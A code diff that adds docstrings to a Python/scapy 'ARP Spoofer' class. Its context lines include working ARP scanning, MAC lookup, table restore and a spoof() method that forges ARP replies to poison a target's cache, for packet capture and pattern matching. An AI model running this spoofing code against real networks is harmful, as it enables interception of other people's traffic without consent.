@@ -22,11 +22,40 @@ from src.types.models import PacketInfo, Device
 from src.utils.validators import validate_ip
 from jinja2 import Environment, FileSystemLoader
 
-
 warnings.filterwarnings("ignore")
 
+"""
+ARP Spoofer module for network packet manipulation and analysis.
+
+This module provides the core functionality for ARP spoofing operations,
+including packet capture, pattern matching, and network device scanning.
+"""
+
 class ARPSpoofer:
+    """
+    Main class for performing ARP spoofing operations.
+
+    Attributes:
+        target_ip (str): Target device IP address
+        gateway_ip (str): Network gateway IP address
+        patterns (list): List of patterns to match in captured packets
+        is_spoofing (bool): Flag indicating if spoofing is active
+        captured_packets (list): List of captured network packets
+
+    Examples:
+        >>> spoofer = ARPSpoofer(target_ip="192.168.1.10")
+        >>> spoofer.run()
+    """
+    
     def __init__(self, target_ip: str = None, gateway_ip: str = None, patterns: list = None):
+        """
+        Initialize the ARPSpoofer instance.
+
+        Args:
+            target_ip (str): Target device IP address
+            gateway_ip (str): Network gateway IP address
+            patterns (list): List of patterns to match in captured packets
+        """
         self.console = Console()
         self.target_ip = target_ip
         self.gateway_ip = gateway_ip
@@ -39,7 +68,18 @@ class ARPSpoofer:
         self.logger = setup_logger("arp_spoofer", self.console)
 
     def scan_network(self, ip_range: str) -> list:
-        """Scan network for active devices."""
+        """
+        Scan network for active devices.
+
+        Args:
+            ip_range (str): IP range to scan (e.g., "192.168.1.0/24")
+
+        Returns:
+            list: List of Device objects representing discovered devices
+
+        Raises:
+            NetworkException: If scanning fails
+        """
         self.console.print("[bold blue]Scanning network...[/]")
         arp_request = ARP(pdst=ip_range)
         broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -174,13 +214,28 @@ class ARPSpoofer:
         self.logger.info(f"Saved captured data to {filename}")
 
     def spoof(self, target_ip: str, spoof_ip: str):
-        """Send ARP spoofing packets with explicit Ethernet destination."""
+        """
+        Send ARP spoofing packets.
+
+        Args:
+            target_ip (str): Target device IP address
+            spoof_ip (str): IP address to spoof
+
+        Raises:
+            NetworkException: If spoofing fails
+        """
         target_mac = self.get_mac(target_ip)
         packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
         scapy.sendp(packet, verbose=False)
 
     def restore(self, destination_ip: str, source_ip: str):
-        """Restore ARP tables."""
+        """
+        Restore ARP tables.
+
+        Args:
+            destination_ip (str): Destination device IP address
+            source_ip (str): Source device IP address
+        """
         try:
             destination_mac = self.get_mac(destination_ip)
             source_mac = self.get_mac(source_ip)
@@ -197,7 +252,18 @@ class ARPSpoofer:
             self.logger.error(f"Error restoring ARP table: {str(e)}")
 
     def get_mac(self, ip: str) -> str:
-        """Get MAC address for IP with better error handling."""
+        """
+        Get MAC address for IP with better error handling.
+
+        Args:
+            ip (str): IP address to resolve
+
+        Returns:
+            str: MAC address
+
+        Raises:
+            NetworkException: If MAC address resolution fails
+        """
         try:
             if not validate_ip(ip):
                 raise NetworkException(f"Invalid IP address: {ip}")
@@ -223,7 +289,12 @@ class ARPSpoofer:
             raise NetworkException(f"Error getting MAC address: {str(e)}") from e
 
     def run(self, format: str = None):
-        """Main execution method."""
+        """
+        Main execution method.
+
+        Args:
+            format (str): Output format for captured data (txt, json, html, csv)
+        """
         try:
             if not self.target_ip:
                 gws = netifaces.gateways()
